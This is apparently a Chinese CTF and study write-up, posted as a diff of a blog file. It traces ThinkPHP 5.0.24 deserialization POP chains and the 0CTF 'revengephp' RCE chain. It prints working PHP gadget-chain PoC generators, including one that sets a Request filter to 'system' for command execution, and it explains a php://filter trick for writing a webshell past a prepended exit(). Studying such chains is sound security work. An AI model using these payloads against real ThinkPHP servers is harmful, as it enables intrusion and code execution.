@@ -1,0 +1,1087 @@
+<hr>
+<p>title: 通过revengephp理解thinkphp反序列化链<br>date: 2021-10-03 21:18:51<br>tags: Web安全</p>
+<hr>
+<h1 id="理解在此前公开的反序列化链"><a href="#理解在此前公开的反序列化链" class="headerlink" title="理解在此前公开的反序列化链"></a>理解在此前公开的反序列化链</h1><p>不仅仅是学pop链，更是学习框架调试</p>
+<h2 id="5-0-24反序列化漏洞分析"><a href="#5-0-24反序列化漏洞分析" class="headerlink" title="5.0.24反序列化漏洞分析"></a>5.0.24反序列化漏洞分析</h2><blockquote>
+<p>开发人员在写程序时会极力的避免安全问题的发生，所以CTF中通过一个Class文件来进行反序列化的操作几乎时不可能存在的</p>
+<p>实际开发在类中很少用到魔术方法等“危险函数”，但我学完这道题后有了一个体悟——“危险函数”,凑一凑总会有的</p>
+</blockquote>
+<p>提到的wp地址:<code>https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</code></p>
+<h2 id="thinkphp5-0-24魔术方法及位置"><a href="#thinkphp5-0-24魔术方法及位置" class="headerlink" title="thinkphp5.0.24魔术方法及位置"></a>thinkphp5.0.24魔术方法及位置</h2><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><blockquote>
+<p>析构函数只在对象被垃圾收集器收集前（从内存中删除之前）才会被自动调用。</p>
+<p>可以理解为对象用完之前调用</p>
+</blockquote>
+<p><img src="image-20211003213508732.png" alt="image-20211003213508732"></p>
+<p>一共有这些</p>
+<p>按现有的wp，反序列化链子用了<code>thinkphp\library\think\process\pipes\Windows.php</code>下的<code>__destruct()</code></p>
+<h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><blockquote>
+<p>调用的方法不存在时会自动调用，程序会继续执行下去。</p>
+</blockquote>
+<p><img src="image-20211003213836859.png" alt="image-20211003213836859"></p>
+<p><code>__call()</code>比较多，按wp选择Output.php，<code>thinkphp\library\think\console\Output.php</code>因为其中的block可以当作跳板</p>
+<p>最终执行的是Request中的<code>__call()</code></p>
+<p><img src="image-20211003214202350.png" alt="image-20211003214202350"></p>
+<h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><blockquote>
+<p>格式化输出这个对象所包含的数据,当对象被当作字符串执行时使用</p>
+</blockquote>
+<p><img src="image-20211003215658427.png" alt="image-20211003215658427"></p>
+<p><code>__toString()</code>也不多，wp中使用了Model类，<code>thinkphp\library\think\Model.php</code></p>
+<p><strong>至此wp中提到的魔术方法位置全部分析完毕，接着直接分析思路</strong></p>
+<h2 id="thinkphp5-0-24反序列化链分析"><a href="#thinkphp5-0-24反序列化链分析" class="headerlink" title="thinkphp5.0.24反序列化链分析"></a>thinkphp5.0.24反序列化链分析</h2><h3 id="跟进-destruct"><a href="#跟进-destruct" class="headerlink" title="跟进 __destruct()"></a>跟进 __destruct()</h3><p>按wp的思路，首先跟进<code>__destruct()</code>,<code>thinkphp\library\think\process\pipes\Windows.php</code></p>
+<pre><code class="php">public function __destruct()
+{
+    $this-&gt;close(); // 关闭
+    $this-&gt;removeFiles(); // 指向removeFiles方法
+}
+</code></pre>
+<h3 id="removeFiles"><a href="#removeFiles" class="headerlink" title="removeFiles()"></a>removeFiles()</h3><pre><code class="php">/**
+ * 删除临时文件
+ */    
+private function removeFiles()
+{
+    foreach ($this-&gt;files as $filename) { // 遍历files数组
+        if (file_exists($filename)) { // 判断文件是否存在
+            @unlink($filename); // 关闭文件连接-删除文件
+        }
+    }
+    $this-&gt;files = []; // 清空 files数组
+}
+</code></pre>
+<p>其中file_exists()函数可以调用<code>__toString()</code>方法，所以下一步要看看那个<code>__toString()</code>方法可以调用</p>
+<h3 id="toString"><a href="#toString" class="headerlink" title="__toString()"></a>__toString()</h3><p>这一步我卡了好久，一直没有明白是怎么调进<code>thinkphp\library\think\Model.php</code>的<code>__toString()</code></p>
+<p>直到我看了poc</p>
+<pre><code class="php">class Windows extends Pipes{
+    private $files = [];
+
+    function __construct(){
+        $this-&gt;files = [new Pivot()];
+    }
+}
+</code></pre>
+<p>搜索Pivot() ,找到<code>thinkphp\library\think\model\Pivot.php</code></p>
+<p><img src="image-20211004195037451.png" alt="image-20211004195037451"></p>
+<p>Pivot类继承了Model类，所以只要将文件名设为Pivot的实例对象，框架就会调用进Model中的<code>__toString()</code></p>
+<h3 id="toJson"><a href="#toJson" class="headerlink" title="toJson()"></a>toJson()</h3><p><img src="image-20211004195253706.png" alt="image-20211004195253706"></p>
+<p>接下来<code>__toString()</code>指向了toJson()方法，继续跟进</p>
+<p><img src="image-20211004195431444.png" alt="image-20211004195431444"></p>
+<p>到这里为止poc可以这样写</p>
+<pre><code class="php">&lt;?php
+namespace think\process\pipes;
+use think\model\Pivot;
+abstract class Pipes{} // Windows对此进行了继承，所以需要写一下
+class Windows extends Pipes{
+    private $files = [];
+    public function __construct()
+    {
+        $this-&gt;files = [new Pivot()];
+        /*Pivot类继承了Model类，所以files引用Pivot实例会跳转Model类的toString*/
+    }
+}
+
+//调用至Model类
+namespace think;
+class Model{}
+namespace think\model;
+use think\Model;
+class Pivot extends Model{}
+
+//输出exp
+namespace think;
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
+</code></pre>
+<p><img src="image-20211009210524614.png" alt="image-20211009210524614"></p>
+<p>成功调用到toArray()方法</p>
+<h3 id="toArray"><a href="#toArray" class="headerlink" title="toArray()"></a>toArray()</h3><p>接着继续跟进toArray()</p>
+<pre><code class="php">public function toArray()
+    {
+        $item    = [];
+        $visible = [];
+        $hidden  = [];
+
+        $data = array_merge($this-&gt;data, $this-&gt;relation); // 合并data数组和relation数组
+
+        // 过滤属性
+        if (!empty($this-&gt;visible)) {
+            $array = $this-&gt;parseAttr($this-&gt;visible, $visible);
+            $data  = array_intersect_key($data, array_flip($array)); // 使用键名比较计算数组的交集
+        } elseif (!empty($this-&gt;hidden)) {
+            $array = $this-&gt;parseAttr($this-&gt;hidden, $hidden, false);
+            $data  = array_diff_key($data, array_flip($array)); // 交換數組鍵和值后用建比較數組的差集
+        }
+
+        foreach ($data as $key =&gt; $val) {
+            if ($val instanceof Model || $val instanceof ModelCollection) {
+                // 关联模型对象
+                $item[$key] = $this-&gt;subToArray($val, $visible, $hidden, $key);
+            } elseif (is_array($val) &amp;&amp; reset($val) instanceof Model) {
+                // 关联模型数据集
+                $arr = [];
+                foreach ($val as $k =&gt; $value) {
+                    $arr[$k] = $this-&gt;subToArray($value, $visible, $hidden, $key);
+                }
+                $item[$key] = $arr;
+            } else {
+                // 模型属性
+                $item[$key] = $this-&gt;getAttr($key);
+            }
+        }
+        // 追加属性（必须定义获取器）
+        if (!empty($this-&gt;append)) {
+            foreach ($this-&gt;append as $key =&gt; $name) {
+                if (is_array($name)) {
+                    // 追加关联对象属性
+                    $relation   = $this-&gt;getAttr($key);
+                    $item[$key] = $relation-&gt;append($name)-&gt;toArray();
+                } elseif (strpos($name, &#39;.&#39;)) {
+                    list($key, $attr) = explode(&#39;.&#39;, $name);
+                    // 追加关联对象属性
+                    $relation   = $this-&gt;getAttr($key);
+                    $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();
+                } else {
+                    $relation = Loader::parseName($name, 1, false);
+                    if (method_exists($this, $relation)) {
+                        $modelRelation = $this-&gt;$relation();
+                        $value         = $this-&gt;getRelationData($modelRelation);
+
+                        if (method_exists($modelRelation, &#39;getBindAttr&#39;)) {
+                            $bindAttr = $modelRelation-&gt;getBindAttr();
+                            if ($bindAttr) {
+                                foreach ($bindAttr as $key =&gt; $attr) {
+                                    $key = is_numeric($key) ? $attr : $key;
+                                    if (isset($this-&gt;data[$key])) {
+                                        throw new Exception(&#39;bind attr has exists:&#39; . $key);
+                                    } else {
+                                        $item[$key] = $value ? $value-&gt;getAttr($attr) : null;
+                                    }
+                                }
+                                continue;
+                            }
+                        }
+                        $item[$name] = $value;
+                    } else {
+                        $item[$name] = $this-&gt;getAttr($name);
+                    }
+                }
+            }
+        }
+        return !empty($item) ? $item : [];
+    }
+</code></pre>
+<p>代码很多，这里我也没什么号的思路，wp是以目标来进行倒推</p>
+<p>因为最终的目标是<code>__call()</code>，所以需要去找存在函数调用的点，并寻找那个调用可控</p>
+<p>可以找到三个发生了方法调用的点</p>
+<p><img src="image-20211004210222133.png" alt="image-20211004210222133"></p>
+<p>追踪过去，发现只有第三个可控</p>
+<p><img src="image-20211004210313870.png" alt="image-20211004210313870"></p>
+<p><img src="image-20211004210327337.png" alt="image-20211004210327337"></p>
+<p>调用条件可以根据代码得知</p>
+<pre><code class="php">需要满足的条件是
+if (!empty($this-&gt;append))
+if (method_exists($this, $relation))
+if (method_exists($modelRelation, &#39;getBindAttr&#39;))
+if ($bindAttr)
+
+且不满足
+if (is_array($name))
+elseif (strpos($name, &#39;.&#39;))
+if (isset($this-&gt;data[$key]))
+</code></pre>
+<p>然后分析$value的执行过程</p>
+<pre><code class="php">protected $append = []; // 定义数组append
+foreach ($this-&gt;append as $key =&gt; $name) {...} // 遍历，获取值为$name
+$relation = Loader::parseName($name, 1, false); //解析name
+if(method_exists($this, $relation)){...} // 判断$relation方法是否存在
+$modelRelation = $this-&gt;$relation(); // 调用该方法
+$value      = $this-&gt;getRelationData($modelRelation); // 获取$value
+$item[$key] = $value ? $value-&gt;getAttr($attr) : null; // 进行判断
+</code></pre>
+<p>可知想得到可控的$value，必须使$modelRelation可控</p>
+<p><strong>而modelRelation调用了relation，并最终调用数组append</strong></p>
+<p><strong>数组append可控</strong>*</p>
+<p>还需要modelRelation可控，可以将$modelRelation设为getError</p>
+<pre><code class="php">protected $error = []; // error可控
+public function getError()
+{
+    return $this-&gt;error;
+}
+</code></pre>
+<h3 id="getRelationData-Relation-modelRelation"><a href="#getRelationData-Relation-modelRelation" class="headerlink" title="getRelationData(Relation $modelRelation)"></a>getRelationData(Relation $modelRelation)</h3><p>我的最终目的是可以通过$value去Output类的<code>__call</code>方法</p>
+<p>所以返回的$value应是一个不存在的方法</p>
+<pre><code class="php">protected function getRelationData(Relation $modelRelation)
+{
+    if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) {
+        $value = $this-&gt;parent;
+    } else {
+        // 首先获取关联数据
+        if (method_exists($modelRelation, &#39;getRelation&#39;)) {
+            $value = $modelRelation-&gt;getRelation();
+        } else {
+            throw new BadMethodCallException(&#39;method not exists:&#39; . get_class($modelRelation) . &#39;-&gt; getRelation&#39;);
+        }
+    }
+    return $value;
+}
+</code></pre>
+<p>在跳转的这个方法中，第一条if语句是可控的，可以调用到Output类，条件</p>
+<pre><code class="php">$this-&gt;parent // 存在parent
+    /*写就有，目标也肯定是Output类*/
+&amp;&amp;!$modelRelation-&gt;isSelfRelation() // $modelRelation 不为isSelfRelation方法
+    /*无关紧要*/
+&amp;&amp;get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent) // parent的类名与$modelRelation指向结果类名一致
+    /*
+    * get_class($this-&gt;parent) == think\console\Output
+    * get_class($modelRelation-&gt;getModel())
+    */
+</code></pre>
+<h4 id="getModel"><a href="#getModel" class="headerlink" title="getModel()"></a>getModel()</h4><p><img src="image-20211009215539409.png" alt="image-20211009215539409"></p>
+<p>该方法完成了一次调用，跳至<code>thinkphp/library/think/db/Query.php</code>的getModel方法</p>
+<h4 id="geModel-Query类"><a href="#geModel-Query类" class="headerlink" title="geModel() // Query类"></a>geModel() // Query类</h4><p><img src="image-20211009215724513.png" alt="image-20211009215724513"></p>
+<p>返回一个model，其中model是可控的</p>
+<p>按照上面的条件</p>
+<pre><code class="php">get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)
+</code></pre>
+<p>只需要使Relation类中query指向Query类，Query中model指向Output类即可</p>
+<p>此时需要用到之前提到的数组error，该类完整的调用关系应该是</p>
+<pre><code class="php">$modelRelation-&gt;query-&gt;-&gt;model;
+//注意$modelRelation条件
+method_exists($modelRelation, &#39;getBindAttr&#39;) &amp;&amp; !isset($this-&gt;data[$key])
+</code></pre>
+<p><strong>所以要将$modelRelation 赋值为一个可以调用query，或者说和Relation类有关系且存在getBindAttr的对象，并且Relation是抽象类，所以优先找子类</strong></p>
+<p>搜索后发现：</p>
+<p><img src="image-20211010095910991.png" alt="image-20211010095910991"></p>
+<p>model下有个名为OneToOne的抽象类继承了Relation类</p>
+<p>抽象类不能被实例化，所以找OneToOne的子类</p>
+<p><img src="image-20211010100147506.png" alt="image-20211010100147506"></p>
+<p>这里有两个子类，随便一个应该都可以，这里我想和wp区分开，所以我用BelongsTo类</p>
+<pre><code class="php">protected $error = [new BelongsTo()];
+</code></pre>
+<p>此时应该可以进入Output类</p>
+<pre><code class="php">&lt;?php
+//调用至Model类
+namespace think;
+use think\console\Output;
+use think\model\relation\BelongsTo;
+
+class Model{
+    protected $append = [];
+    public $parent; // 对parent的调用出了子类，所以需要改为public
+    protected $error;
+    public function __construct(){
+        $this-&gt;error = new BelongsTo();
+        $this-&gt;append = [&quot;getError&quot;];
+        $this-&gt;parent = new Output();
+    }
+}
+
+namespace think\process\pipes;
+use think\model\Pivot;
+abstract class Pipes{} // Windows对此进行了继承，所以需要写一下
+class Windows extends Pipes{
+    private $files = [];
+    public function __construct()
+    {
+        $this-&gt;files = [new Pivot()];
+        /*Pivot类继承了Model类，所以files引用Pivot实例会跳转Model类的toString*/
+    }
+}
+
+// Pivot类
+namespace think\model;
+use think\Model;
+class Pivot extends Model{}
+
+//调用Output类
+namespace think\console;
+class Output{}
+
+//调用Query类（Relation前置）
+namespace think\db;
+use think\console\Output;
+class Query{
+    protected $model;
+    public function __construct()
+    {
+        $this-&gt;model =  new Output();
+    }
+}
+
+// 调用Relation类（Model的条件判断）
+namespace think\model;
+use think\db\Query;
+abstract class Relation{
+    protected $query;
+    public function __construct()
+    {
+        $this-&gt;query = new Query(); // 调用向Query，完成函数
+    }
+}
+
+////调用继承了Relation的子类
+namespace think\model\relation;
+use think\model\Relation;
+abstract class OneToOne extends Relation{}
+
+
+//调用继承了OneToOne的子类
+namespace think\model\relation;
+class BelongsTo extends OneToOne{
+    public function __construct()
+    {
+        parent::__construct();
+        $this-&gt;bindAttr = [&quot;no&quot;,&quot;123&quot;];  // 使bindAttr值存在
+    }
+}
+
+//输出exp
+namespace think;
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
+</code></pre>
+<p><img src="image-20211010114906516.png" alt="image-20211010114906516"></p>
+<h3 id="class-Output-call"><a href="#class-Output-call" class="headerlink" title="class Output __call()"></a>class Output __call()</h3><p>在这里进了__call</p>
+<pre><code class="php">public function __call($method, $args)
+{
+    if (in_array($method, $this-&gt;styles)) {
+        array_unshift($args, $method);
+        return call_user_func_array([$this, &#39;block&#39;], $args); //调用回调函数，并把一个数组参数作为回调函数的参数
+        /*把第一个参数作为回调函数调用，把参数数组(第二个参数)作为回调函数的的参数传入。*/
+    }
+
+    if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) {
+        return call_user_func_array([$this-&gt;handle, $method], $args);
+    } else {
+        throw new Exception(&#39;method not exists:&#39; . __CLASS__ . &#39;-&gt;&#39; . $method);
+    }
+}
+</code></pre>
+<p>所以这里调用了block方法，继续跟上去</p>
+<h3 id="block"><a href="#block" class="headerlink" title="block()"></a>block()</h3><pre><code class="php">//block
+protected function block($style, $message)
+{
+    $this-&gt;writeln(&quot;&lt;{$style}&gt;{$message}&lt;/$style&gt;&quot;);
+}
+//跟进writeln
+public function writeln($messages, $type = self::OUTPUT_NORMAL)
+{
+    $this-&gt;write($messages, true, $type);
+}
+//跟进write
+public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
+{
+    $this-&gt;handle-&gt;write($messages, $newline, $type);
+}
+/*
+*private $handle = null; handle可控
+*/
+</code></pre>
+<p>到这里再跟下去没有意义，因为handle可控，所以直接全局搜write方法，寻找利用点</p>
+<p>可以找到/thinkphp/library/think/session/driver/Memcached.php</p>
+<p><img src="image-20211010151914110.png" alt="image-20211010151914110"></p>
+<p>这里handle仍然可控，所以开始全局搜set()方法</p>
+<h3 id="File-php"><a href="#File-php" class="headerlink" title="File.php"></a>File.php</h3><p>一个一个找下去，可以找到一个写入文件的类</p>
+<p><img src="image-20211010153014237.png" alt="image-20211010153014237"></p>
+<p>这里我认为可能存在文件写入来造成rce，不过截止目前我并没有想到绕过的方法</p>
+<p>反而收获一个小技巧</p>
+<h4 id="绕过“死亡”exit"><a href="#绕过“死亡”exit" class="headerlink" title="绕过“死亡”exit"></a>绕过“死亡”exit</h4><p>在$data可控的前提下，这里可以进行任意文件的写入，但程序运行到exit就会终止，所以程序本身的exit()过滤掉</p>
+<p><strong>这个技巧可以看P牛的文章<code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code></strong></p>
+<p>简单来说只是用到了base64的一点小技巧</p>
+<p>base64执行过分可以分为两步</p>
+<blockquote>
+<p>1、将不属于base64编码的字符“处理”掉</p>
+<p>2、解码处理后的base64字符串</p>
+</blockquote>
+<p>若$data可控，那么就可以将要执行的代码进行base64编码后写入文件</p>
+<p>然后用php特有的php://filter 协议以base64-decode的形式读取，这样程序自己写入的<code>&lt;?php exit();?&gt;</code>就会被解释为乱码，而我们自己写入的内容被正常解析，这样就达到了上传恶意文件的目的</p>
+<p>不过显然这一步没法利用，但之后可以</p>
+<h4 id="filename可控"><a href="#filename可控" class="headerlink" title="filename可控"></a>filename可控</h4><p>言归正传，想直接getshell的美妙想法大概是凉凉了，所以继续学习wp</p>
+<p>除了$expire外，$filename同样可控</p>
+<p><img src="image-20211010171340538.png" alt="image-20211010171340538"></p>
+<p>跟进getCacheKey()</p>
+<h3 id="CacheKey"><a href="#CacheKey" class="headerlink" title="CacheKey()"></a>CacheKey()</h3><pre><code class="php">protected function getCacheKey($name, $auto = false)
+{
+    $name = md5($name); // 先将传入的name值md5编码
+    if ($this-&gt;options[&#39;cache_subdir&#39;]) {
+        // 使用子目录
+        $name = substr($name, 0, 2) . DS . substr($name, 2);
+    }
+    if ($this-&gt;options[&#39;prefix&#39;]) {
+        $name = $this-&gt;options[&#39;prefix&#39;] . DS . $name;
+    }
+    $filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;; // options可控，文件路径可控
+    $dir      = dirname($filename);
+
+    if ($auto &amp;&amp; !is_dir($dir)) {
+        //创建文件夹，权限755
+        mkdir($dir, 0755, true);
+    }
+    return $filename;
+}
+</code></pre>
+<p>这里可以创建一个具有读写权限的路径便于写入的shell执行一些操作</p>
+<h3 id="setTagItem"><a href="#setTagItem" class="headerlink" title="setTagItem()"></a>setTagItem()</h3><p>回到File.php，在文件创建成功后会进行一次判断，</p>
+<p><img src="image-20211010175515850.png" alt="image-20211010175515850"></p>
+<p>跟进setTagItem()</p>
+<pre><code class="php">protected function setTagItem($name)
+{
+    if ($this-&gt;tag) { 
+        $key       = &#39;tag_&#39; . md5($this-&gt;tag); // tag可控，故key可控
+        $this-&gt;tag = null; //重置tag
+        if ($this-&gt;has($key)) {
+            $value   = explode(&#39;,&#39;, $this-&gt;get($key)); //将字符串key转为数组 
+            $value[] = $name; // 在开头加上$name
+            $value   = implode(&#39;,&#39;, array_unique($value)); //将数组转回字符串
+        } else {
+            $value = $name;
+        }
+        $this-&gt;set($key, $value, 0); //重新进入set
+    }
+}
+</code></pre>
+<p>当重新进入set()方法后，$name, $value值就存在了，而且都可控</p>
+<p>此时再次调用进上面的方法，文件就成功写入了</p>
+<p><img src="image-20211010204705651.png" alt="image-20211010204705651"></p>
+<p><img src="image-20211010204728040.png" alt="image-20211010204728040"></p>
+<p>至此thinkphp5.0.24的第一条pop链就利用完毕了</p>
+<blockquote>
+<p>注： windows不能使用这条链进行rce</p>
+<p>因为windows文件夹不允许绕过exit所使用的名称</p>
+<p>而Linux没有直接限制，故这条链在windows环境只能写目录，而Linux环境可以getshell</p>
+</blockquote>
+<h2 id="POC-创建目录"><a href="#POC-创建目录" class="headerlink" title="POC 创建目录"></a>POC 创建目录</h2><pre><code class="php">&lt;?php
+//abstract class Driver
+namespace think\cache;
+abstract class Driver{}
+
+//class File extends Driver
+namespace think\cache\driver;
+use think\cache\Driver;
+class File extends Driver{
+    protected $options = [
+        &#39;expire&#39;        =&gt; 0,
+        &#39;cache_subdir&#39;  =&gt; false,
+        &#39;prefix&#39;        =&gt; &#39;&#39;,
+        &#39;path&#39;          =&gt; &quot;./aaaaa/&quot;,
+        &#39;data_compress&#39; =&gt; false,
+    ];
+}
+
+//class Memcache extends SessionHandler
+namespace think\session\driver;
+use SessionHandler;
+use think\cache\driver\File;
+
+class Memcache extends SessionHandler {
+    protected $handler = null;
+    public function __construct()
+    {
+        $this-&gt;handler = new File();
+    }
+}
+
+//class Output
+namespace think\console;
+use think\session\driver\Memcache;
+
+class Output{
+    protected $styles = [&#39;getAttr&#39;];
+    private $handle = null;
+    public function __construct()
+    {
+        $this-&gt;handle = new Memcache();
+    }
+}
+
+//class Query
+namespace think\db;
+use think\console\Output;
+
+class Query{
+    protected $model;
+    public function __construct()
+    {
+        $this-&gt;model = new Output();
+    }
+}
+
+//abstract class Relation
+namespace think\model;
+use think\db\Query;
+abstract class Relation{
+    protected $query;
+    public function __construct()
+    {
+        $this-&gt;query = new Query();
+    }
+}
+
+//abstract class OneToOne extends Relation
+namespace think\model\relation;
+use think\model\Relation;
+abstract class OneToOne extends Relation{
+    protected $bindAttr = [];
+    public function __construct()
+    {
+        parent::__construct();
+        /**
+        * 这里我本来也看的莫名奇妙
+        * 直到我翻文章看到一句话
+        * 三重继承的时候，最顶端的类的 __construct() 不会自动调用
+        * 经过我自己的测试，是真的
+        */
+        $this-&gt;bindAttr = [&#39;no&#39;,&#39;123&#39;];
+    }
+}
+
+//class BelongsTo extends OneToOne
+class BelongsTo extends OneToOne{}
+
+//abstract class Model
+namespace think;
+use think\console\Output;
+use think\model\relation\BelongsTo;
+
+abstract class Model{
+    protected $append = [];
+    protected $error;
+    protected $parent;
+    public function __construct()
+    {
+        $this-&gt;parent = new Output();
+        $this-&gt;error = new BelongsTo();
+        $this-&gt;append = [&quot;getError&quot;];
+    }
+}
+
+// class Pivot extends Model
+namespace think\model;
+use think\Model;
+class Pivot extends Model{}
+
+//class Pipes
+//class Windows extends Pipes
+namespace think\process\pipes;
+use think\model\Pivot;
+class Pipes{}
+class Windows extends Pipes{
+    private $files = [];
+    function __construct(){
+        $this-&gt;files = [new Pivot()];
+    }
+}
+
+
+namespace think\process;
+use think\process\pipes\Windows;
+$Windows = new Windows();
+echo base64_encode(serialize($Windows));
+</code></pre>
+<p><img src="image-20211011182333869-16339551654012.png" alt="image-20211011182333869"></p>
+<h4 id="三重继承，最顶端的类的-construct-不会自动调用"><a href="#三重继承，最顶端的类的-construct-不会自动调用" class="headerlink" title="三重继承，最顶端的类的 __construct() 不会自动调用"></a>三重继承，最顶端的类的 __construct() 不会自动调用</h4><pre><code class="php">&lt;?php
+abstract class  Relation{
+    protected $query;
+    public function __construct()
+    {
+        $this-&gt;query = &quot;query&quot;;
+    }
+}
+abstract class OneToOne extends  Relation {
+    protected $bindAttr = null;
+    public function __construct()
+    {
+        parent::__construct(); // 父构造器继承
+        $this-&gt;bindAttr = &quot;bindAttr&quot;;
+    }
+}
+
+class BelongsTo extends OneToOne{
+
+
+    public function getQuery(){
+        echo $this-&gt;query;
+    }
+    public function getBindAttr(){
+        echo $this-&gt;bindAttr;
+    }
+}
+
+$BelongsTo = new BelongsTo();
+
+echo $BelongsTo-&gt;getBindAttr(),&quot;\n&quot;;
+echo $BelongsTo-&gt;getQuery();
+</code></pre>
+<ul>
+<li><p>注释父类构造调用</p>
+<p>   最顶层query没有调用</p>
+</li>
+</ul>
+<p><img src="image-20211011210214584.png" alt="image-20211011210214584"></p>
+<ul>
+<li><p>不注释父类构造调用</p>
+<p>  最顶层query调用成功</p>
+</li>
+</ul>
+<p><img src="image-20211011210241263.png" alt="image-20211011210241263"></p>
+<p>我就说调试怎么总在这里跳到错误页面</p>
+<blockquote>
+<p>思维导图</p>
+</blockquote>
+<p><img src="tu1-16341943845002.png" alt="tu1-16341943845002"></p>
+<h1 id="revengephp-rce-链"><a href="#revengephp-rce-链" class="headerlink" title="revengephp rce 链"></a>revengephp rce 链</h1><p>上面那条有人已经挖到了windows环境下反序列化的方法，这个就不赘述了，接下来直接分析revengephp的rce链</p>
+<p>这里模拟真实情况从后往前进行一次分析</p>
+<p>原文地址<code>https://igml.top/2021/09/28/2021-0CTF-FINAL/</code></p>
+<h2 id="调用已知终点"><a href="#调用已知终点" class="headerlink" title="调用已知终点"></a>调用已知终点</h2><p>根据文章，已知rce终点为：<code>private function filterValue(&amp;$value, $key, $filters)</code> 位于thinkphp/library/think/Request.php中</p>
+<p><img src="image-20211013161244461.png" alt="image-20211013161244461"></p>
+<p><strong>这里我们需要一个可控$filter的方法，已经调用了filterValue()的方法来让我们进行下一步操作</strong></p>
+<p>调用filterValue()时前提条件，所以我们先全局搜索找到调用了filterValue()方法的位置</p>
+<p><img src="image-20211013164242347.png" alt="image-20211013164242347"></p>
+<p>只有两个，那就没其他的选择，</p>
+<p>其中input中还调用了getFilter()方法，可以对$filter赋值</p>
+<pre><code class="php">protected $filter;
+if (is_null($filter)) {
+    $filter = [];
+} else {
+    $filter = $filter ?: $this-&gt;filter; // 这里可控
+}
+</code></pre>
+<p>cookie()方法没有调用点，直接排除</p>
+<p><img src="image-20211013162426856.png" alt="image-20211013162426856"></p>
+<pre><code class="php">阶段poc
+namespace think;
+class Request{
+    protected $filter;
+    public function __construct()
+    {
+        $this-&gt;filter = &quot;system&quot;;
+    }
+}
+</code></pre>
+<p><img src="image-20211013162044735.png" alt="image-20211013162044735"></p>
+<h2 id="public-function-input"><a href="#public-function-input" class="headerlink" title="public function input()"></a>public function input()</h2><p>接着找可以调用input()的位置</p>
+<p>这里就很多了，不过最后选择get()</p>
+<p><img src="image-20211013163334433.png" alt="image-20211013163334433"></p>
+<p>因为这些能调用input()的方法仍然没有一个可以调出去，但记下位置进行查找，会发现get()可以被任意调用</p>
+<p><img src="image-20211013163856943.png" alt="image-20211013163856943"></p>
+<p>可控调用多的一匹，真是幸福的烦恼</p>
+<p>这里有个很熟悉的地方</p>
+<p><img src="image-20211013165151697.png" alt="image-20211013165151697"></p>
+<p>眼熟吗？成功调进上一条链子，可控的都是handler</p>
+<pre><code class="php">阶段poc
+//class Request 执行终点
+namespace think;
+class Request{
+    protected $filter;
+    public function __construct()
+    {
+        $this-&gt;filter = &quot;system&quot;;
+    }
+}
+
+//abstract class Driver{} Memcache父类
+namespace think\cache;
+use think\Request;
+abstract class Driver{
+    protected $handler = null;
+    public function __construct()
+    {
+        $this-&gt;handler = new Request();
+    }
+}
+
+//class Memcache extends Driver 调向Request
+namespace think\cache\driver;
+use think\cache\Driver;
+class Memcache extends Driver{}
+</code></pre>
+<p>至于为什么选择has()方法，set()指向了has()，而上一条链中间刚好指向了set()</p>
+<p><img src="image-20211013170403327.png" alt="image-20211013170403327"></p>
+<p><img src="image-20211013191328955.png" alt="image-20211013191328955"></p>
+<p>这里指向了set()</p>
+<blockquote>
+<p><strong>注意，这里实际上并不是上一条链的Memcache.php，只是有着相同的类名</strong></p>
+<p><strong>这里的Memcache位于thinkphp/library/think/cache/driver/Memcache.php</strong></p>
+<p><strong>上一条位于thinkphp/library/think/session/driver/Memcache.php</strong></p>
+</blockquote>
+<p>所以从上一条该位置接过来，这条rce链就完成了</p>
+<pre><code class="php">阶段poc
+//class Request 执行终点
+namespace think;
+class Request{
+    protected $filter;
+    public function __construct()
+    {
+        $this-&gt;filter = &quot;system&quot;;
+    }
+}
+
+//abstract class Driver{} Memcache父类
+namespace think\cache;
+use think\Request;
+abstract class Driver{
+    protected $handler = null;
+    public function __construct()
+    {
+        $this-&gt;handler = new Request();
+    }
+}
+
+//class Memcache extends Driver 调向Request
+namespace think\cache\driver;
+use think\cache\Driver;
+class Memcache extends Driver{}
+
+//class Memcache extends SessionHandler 调向上面Memcache类的set方法
+namespace think\session\driver;
+use SessionHandler;
+class Memcache extends SessionHandler{
+    protected $handler = null;
+    public function __construct()
+    {
+        $this-&gt;handler = new \think\cache\driver\Memcache();
+    }
+}
+
+//class Output
+namespace think\console;
+use think\session\driver\Memcache;
+class Output{
+    private $handle = null;
+    public function __construct()
+    {
+        $this-&gt;handle = new Memcache();
+    }
+}
+</code></pre>
+<h2 id="从起点找调用位置"><a href="#从起点找调用位置" class="headerlink" title="从起点找调用位置"></a>从起点找调用位置</h2><p>虽说上面其实已经可以去接poc了，不过我还是按正常逻辑分析一次</p>
+<blockquote>
+<p>首先需要明确</p>
+<p>找反序列化的过程都分为两个，一个是找起点，一个是找终点</p>
+<p>这条链是假设在找到了终点的情况下去逆推调用起点</p>
+</blockquote>
+<ul>
+<li><p>终点：</p>
+<p>  在反序列化中，最终用来执行我们目录的位置是终点</p>
+</li>
+<li><p>起点：</p>
+<p>  程序最初必然调用的点是起点</p>
+<p>  简单来说：我们自然可以直接new 一个类去调用，但直接调用类不一定会调用进相应的方法，所以起点就是只要程序执行，就必然会调用的那个类，比如：<code>__destruct()</code>,<code>__wake()</code>等，偶尔也可以直接用<code>__call()</code>等方法</p>
+<p>  总而言之，起点即为web应用类中必然执行的方法</p>
+</li>
+</ul>
+<p>在这两条链中，起点是thinkphp/library/think/process/pipes/Windows.php 下的<code>__destruct()</code>方法</p>
